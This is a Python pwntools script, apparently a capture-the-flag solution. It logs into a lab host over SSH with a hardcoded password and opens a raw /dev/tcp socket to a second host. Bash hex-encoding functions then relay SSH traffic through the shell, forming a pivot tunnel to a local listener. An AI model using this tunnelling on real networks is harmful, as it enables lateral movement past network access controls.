from pwn import *

# context.log_level = 'debug'

ssh_conn = ssh(user='ctf', host='second', password='x5kdkwjr8exi2bf70y8g80bggd2nuepf',
           proxy_command='nc localhost 20228')

conn = ssh_conn.shell()
conn.recvuntil(b'-bash-5.1$ ')
conn.sendline(b'exec 3<>/dev/tcp/third/22')
conn.recvuntil(b'-bash-5.1$ ')

# when read to a variable, all null bytes are trimmed!! so the possible "packet size parameter" (which should be 00000434) becomes shifted to 04340714,
#  so bad packet size 0x04340714 = 70518548
# read -n won't ignore \0 but we have to be careful though
conn.sendline(b'b16enc () { byte=; IFS= read -r -d "" -u 3 -t .01 -n 1 byte; until [[ $? -gt 128 ]]; do if [[ -z $byte ]] ; then echo -n 00; else hex=$(printf "%02X" "\'$byte"); echo -n "$hex" ; fi; byte=; IFS= read -r -d "" -u 3 -t .01 -n 1 byte; done }')
conn.recvuntil(b'-bash-5.1$ ')
conn.sendline(b'b16dec () { for ((i=0; i<$((${#1} / 2)); i++)); do hex=${1:$((2*$i)):2}; printf "\\x$hex"; done }')
conn.recvuntil(b'-bash-5.1$ ')

DEBUG = False
if DEBUG:
    conn.sendline(b'b16enc')
    conn.sendline(b'b16dec 5353482D322E302D4F70656E5353485F382E397031205562756E74752D337562756E7475302E340D0A >&3')
    conn.interactive()

# sshpass -p x5kdkwjr8exi2bf70y8g80bggd2nuepf ssh -vvv -o ProxyCommand="nc localhost 20229" ctf@third
print('start listen on 20229')
sock_input = listen(20229)
conn_input = sock_input.wait_for_connection()
print('establish on 20229')

# plan: have a function wrapper that converts msg to b16
# context.log_level = 'error'
while True:
    b16ciph = b''
    while True:
        conn.sendline(b'b16enc')
        b16ciph_frag = conn.recvuntil(b'-bash-5.1$ ', drop=True)
        if b16ciph_frag.startswith(b'b16enc\r\n'):
            b16ciph_frag = b16ciph_frag.replace(b'b16enc\r\n', b'')
        if b16ciph_frag:
            b16ciph += b16ciph_frag
        else:
            break

    if b16ciph:
        # print('receive', b16ciph.decode())
        conn_input.send(base64.b16decode(b16ciph))

    # get cmd
    cmd = b''
    while frag := conn_input.recv(65536, timeout=.01):
        cmd += frag
        if len(cmd) > 1024:
            break
    # cmd = conn_input.recv(65536, timeout=.01)
    
    if cmd:
        # print('send', base64.b16encode(cmd).decode())
        # print('send', cmd)
        escape_expand = ''.join([f"\\x{c:02x}" for c in cmd])
        full_cmd = f"printf \"{escape_expand}\" >&3"

        conn.sendline(full_cmd.encode())
        conn.recvuntil(b' >&3\r\n-bash-5.1$ ')


conn.interactive()